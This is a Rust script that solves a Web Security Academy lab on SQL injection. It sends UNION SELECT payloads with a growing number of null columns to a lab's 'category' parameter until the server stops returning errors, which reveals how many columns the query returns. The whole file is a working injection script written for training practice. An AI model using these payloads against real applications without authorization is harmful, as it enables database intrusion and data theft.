/***********************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 16/9/2023
*
* Lab: SQL injection UNION attack, determining the number of columns returned
*      by the query
*
* Steps: 1. Inject payload into 'category' query parameter to determine
*           the number of columns
*        2. Add one additional null column at a time
*        3. Repeat this process, increasing the number of columns until you
*           receive a valid response
*
************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ad600620424ed3981b7ed6c00f40071.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection parameter:".blue(),
        "category".yellow()
    );
    io::stdout().flush();

    for i in 1..10 {
        // number of nulls
        let nulls = "null, ".repeat(i);

        // payload to retreive the number of columns
        let payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // replace the last coma to make the syntax valid

        println!("[*] Trying payload: {}", payload);

        // fetch the page with the injected payload
        let null_injection = client
            .get(format!("{url}/filter?category={payload}"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                    .red()
            ));

        // get the body of the response
        let body = null_injection.text().unwrap();

        // extract error text to determine if the payload is valid or not
        let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);

        // if the error text doesn't exist
        if internal_error.is_none() {
            println!(
                "[#] {}{}",
                "Number of columns: ".white(),
                i.to_string().green().bold()
            );

            break;
        } else {
            continue;
        }
    }

    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}
